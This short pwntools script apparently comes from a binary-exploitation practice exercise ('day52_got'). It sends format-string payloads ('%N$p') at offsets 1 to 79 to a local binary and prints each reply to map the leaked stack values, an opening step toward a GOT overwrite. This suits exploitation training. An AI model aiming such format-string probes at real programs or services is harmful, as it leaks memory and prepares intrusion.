from pwn import *

context.binary = "./day52_got"
context.log_level = "error"

for i in range(1, 80):
	p = process("./day52_got")
	payload = f"%{i}$p".encode()
	p.recvuntil(b"note\n")
	p.sendline(payload)
	out = p.recvline()

	print(i, out)
	p.close()
